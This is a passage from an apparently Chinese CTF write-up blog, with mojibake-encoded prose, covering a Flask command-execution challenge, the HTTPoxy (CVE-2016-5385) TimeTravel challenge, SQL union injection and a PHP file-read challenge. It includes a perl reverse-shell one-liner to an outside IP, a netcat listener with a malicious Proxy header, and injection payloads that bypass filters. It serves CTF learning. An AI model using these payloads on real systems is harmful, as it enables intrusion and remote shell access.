<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>

<p>ä¸€çœ‹å°±çŸ¥é“è¦åå¼¹shell</p>
<p>è¿™é‡Œçš„<code>flag</code>è¢«åˆ é™¤äº†</p>
<p>è®°ä¸€ä¸ªçŸ¥è¯†ç‚¹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“ä¸€ä¸ªè¿›ç¨‹æ‰“å¼€æŸä¸ªæ–‡ä»¶ç›´åˆ°å…³é—­å‰ï¼Œè¯¥è¿›ç¨‹ä¼šè·å¾—æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œæ–‡ä»¶æè¿°ç¬¦é‡Œæœ‰æ–‡ä»¶çš„å†…å®¹ï¼Œå³ä¾¿å·²ç»å°†æ–‡ä»¶åˆ é™¤ï¼Œåªæ˜¯åˆ é™¤äº†å…¶ç›¸åº”çš„ç›®å½•ç´¢å¼•èŠ‚ç‚¹ï¼Œè‹¥è¿›ç¨‹ä¾ç„¶å­˜åœ¨æ²¡è¢«å…³é—­çš„è¯ï¼Œå°±ä¾ç„¶å¯ä»¥é€šè¿‡æ–‡ä»¶æä¾›ç»™å®ƒçš„æ–‡ä»¶æè¿°ç¬¦è¿›è¡Œæ“ä½œ</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°è¯¥è¿›ç¨‹ï¼Œè¯»å–flag</p>
<p><code>/proc/[pid]/fd</code> æ˜¯ä¸€ä¸ªç›®å½•ï¼ŒåŒ…å«è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„æƒ…å†µ</p>
<p>æµ‹å¾—bashåå¼¹ï¼Œcurlåå¼¹éƒ½ä¸å¯ï¼Œæ‰€ä»¥è¿™é‡Œä½¿ç”¨perlåå¼¹ã€‚</p>
<p>å…ˆperlåå¼¹shell,</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;174.1.178.39&quot;;$p&#x3D;7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; &amp;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¯»flag</p>
<p><img src="/.com//1.png" alt="image-20200401215315646"></p>
<h2 id="V-amp-N2020-å…¬å¼€èµ›-TimeTravel"><a href="#V-amp-N2020-å…¬å¼€èµ›-TimeTravel" class="headerlink" title="[V&amp;N2020 å…¬å¼€èµ›]TimeTravel"></a>[V&amp;N2020 å…¬å¼€èµ›]TimeTravel</h2><p>è€ƒå¯Ÿï¼šHTTPoxyæ¼æ´ï¼ˆCVE-2016-5385ï¼‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå…ˆç†è§£åˆ°ä»£ç çš„æ„æ€ï¼šæˆ‘ä»¬æƒ³è¯»åˆ°flagã€‚å°±è¦æ»¡è¶³<code>$data[&#39;success&#39;] === true</code></p>
<p>ä¼ å…¥ä¸€ä¸ªflagï¼Œå°±ä¼šå»è¯·æ±‚HTTP-apiæœåŠ¡ï¼Œå‡å¦‚è¯¥æœåŠ¡å™¨è¿”å›successçš„è¯ï¼Œå°±ä¼šæ‰§è¡Œç¨‹åºè¯»å–flag.</p>
<p>è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯CGI<a href="https://www.cnblogs.com/f-ck-need-u/p/7627035.html" target="_blank" rel="noopener">è§£é‡Š</a></p>
<p>CGIæœ‰ä¸ªç‰¹æ€§å°±æ˜¯ï¼šä¼šå°†headerä¸­çš„proxyå‚æ•°è®¾ç½®å†²ç¯å¢ƒå˜é‡HTTP_PROXY</p>
<p>åœ¨PHP 5.6.23ç‰ˆæœ¬ä¸­å­˜åœ¨æ¼æ´CVE-2016-5385</p>
<p>å‚è€ƒï¼š<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">CVE-2016-5385</a></p>
<p><img src="/.com//2.png" alt=" "></p>
<p>æ‰€ä»¥è§£é¢˜æ€è·¯å¦‚ä¸‹ï¼š</p>
<p>ç°åœ¨vpsä¸­çš„å†™å…¥<code>b.txt</code>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">Date: Fri, <span class="number">06</span> Mar <span class="number">2020</span> <span class="number">18</span>:<span class="number">27</span>:<span class="number">31</span> GMT</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: <span class="number">16</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"success"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>



<p>æ¥ç€ç›‘å¬ç«¯å£</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp <span class="number">8888</span> &lt; b.txt</span><br></pre></td></tr></table></figure>



<p>burpæŠ“åŒ…ï¼Œå‘é€è¯·æ±‚</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?flag=123</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: node3.buuoj.cn:28456</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: pma_lang=zh_CN</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Proxy</span>: http://174.1.178.39:8888</span><br></pre></td></tr></table></figure>

<p>é‡ç‚¹åœ¨äº<code>http://174.1.178.39:8888</code></p>
<p>å½“å‘é€è¯¥è¯·æ±‚çš„æ—¶å€™ï¼Œproxyçš„è¯·æ±‚ä¼šä½œä¸ºHTTP_PROXY</p>
<p>è¿™æ—¶å€™ä¼šè®¿é—®vpsçš„8888ç«¯å£ï¼Œè¿™æ—¶å€™å°±ä¼šå‘é€å‡ºb.txtçš„å†…å®¹ï¼Œä½¿å¾—<code>$data[&#39;success&#39;] === true</code></p>
<p>è·å¾—flag</p>
<p><img src="/.com//3.png" alt="image-20200401234144438"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/" data-id="ck8sqr5j8000okou5d9fcgsbk" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CISCN2019-web-å¤ç°" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/13/CISCN2019-web-%E5%A4%8D%E7%8E%B0/" class="article-date">
  <time datetime="2020-03-13T13:53:47.000Z" itemprop="datePublished">2020-03-13</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/13/CISCN2019-web-%E5%A4%8D%E7%8E%B0/">CISCN2019-éƒ¨åˆ†web[å¤ç°]</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>CISCN2019-webå¤ç°</p>
<h1 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h1><h2 id="SWPUCTF2019-web1"><a href="#SWPUCTF2019-web1" class="headerlink" title="SWPUCTF2019[web1]"></a>SWPUCTF2019[web1]</h2><p>è€ƒç‚¹ï¼šunionæ³¨å…¥ï¼Œinformation_schemaç»•è¿‡ï¼Œæ— åˆ—åæ³¨å…¥</p>
<p>æ³¨å†Œä¸ªè´¦å·è¿›å…¥</p>
<p>åœ¨å‘å¸ƒå¹¿å‘Šå‡ºå‘ç°æ¼æ´çš„è§¦å‘ç‚¹</p>
<p>å°è¯•unionæ³¨å…¥ï¼Œæ­¤å¤„ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½¿ç”¨<code>/**/</code>ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'/**/union/**/select/**/1,2,3/**/'</span></span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶æŠ¥é”™</p>
<p><img src="/.com//2.png" alt="image-20200306190040221"></p>
<p>è¿™æ—¶å€™å»å°è¯•æ·»åŠ åˆ—æ•°ï¼Œæ·»åŠ è‡³22åˆ—æ—¶ï¼Œæ³¨å…¥æˆåŠŸ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200306190243681"></p>
<p>æ³¨æ•°æ®åº“</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">'/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></span><br></pre></td></tr></table></figure>



<p>åœ¨æ³¨è¡¨åæ—¶ï¼Œinformation_schemaè¢«è¿‡æ»¤ï¼Œå‚è€ƒ:<a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_colum</span></span><br><span class="line"><span class="string">ns/**/where/**/table_schema=schema()),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</span></span><br><span class="line"><span class="string">,19,20,21,22/**/'</span></span><br></pre></td></tr></table></figure>

<p>BUUçš„ç¯å¢ƒæ˜¯æ²¡æœ‰è¿™ä¸ª<code>sys.schema_auto_increment_columns</code>è¿™ä¸ªè¡¨çš„ï¼Œmysqlç‰ˆæœ¬ä¸å¯¹å§ã€‚è¿™é‡Œå¯ä»¥ç›²çŒœæ•°æ®è¡¨ä¸º<code>users</code></p>
<p>è¿™é‡Œä½¿ç”¨æ— åˆ—åæ³¨å…¥</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'/**/union/**/select/**/1,(select/**/group_concat(a)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//4.png" alt="image-20200306191321893"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'/**/union/**/select/**/1,		(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select*from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/'</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//5.png" alt="image-20200306191439059"></p>
<p>å‚è€ƒï¼š<a href="https://www.baidu.com/link?url=Gfrs0bBPoYlpq5jTTU2HjY14SP3Do5k9bnagt9sTLWLjSRbf5Z8SaOGjTAKZZn4bAr6lXEHoMqYaDJ602xvnV_&wd=&eqid=e3bccb9a0007b23f000000065e62299b" target="_blank" rel="noopener">sqlæ³¨å…¥(åˆ©ç”¨joinè¿›è¡Œæ— åˆ—åæ³¨å…¥) - GHDä¸¶ - åšå®¢å›­</a></p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–ï¼Œæ–‡ä»¶è¯»å–æ¼æ´</p>
<p>æ³¨é‡Šé‡Œæç¤ºå¯ä»¥ä½¿ç”¨æ–‡ä»¶è¯»å–ï¼Œè¿™é‡Œä½¿ç”¨ä¼ªåè®®è·å¾—æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//xxxx/index.php?file=php://filter/convert.base64-encode/resource=index.php</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html/'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = $_GET["file"];</span></span><br><span class="line">$file = (<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]) ? $_GET[<span class="string">'file'</span>] : <span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/phar|zip|bzip2|zlib|data|input|%00/i"</span>,$file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">'no way!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>(!$row) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"&lt;p&gt;å§“å:"</span>.$row[<span class="string">'user_name'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, ç”µè¯:"</span>.$row[<span class="string">'phone'</span>].<span class="string">"&lt;/p&gt;&lt;p&gt;, åœ°å€:"</span>.$row[<span class="string">'address'</span>].<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æœªæ‰¾åˆ°è®¢å•!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å…¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$result) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error'</span>;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = <span class="string">"è®¢å•ä¿®æ”¹æˆåŠŸ"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = <span class="string">"æœªæ‰¾åˆ°è®¢å•!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    $msg = <span class="string">"ä¿¡æ¯ä¸å…¨"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//delete.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(<span class="string">'delete from `user` where `user_id`='</span> . $row[<span class="string">"user_id"</span>]);</span><br><span class="line">        <span 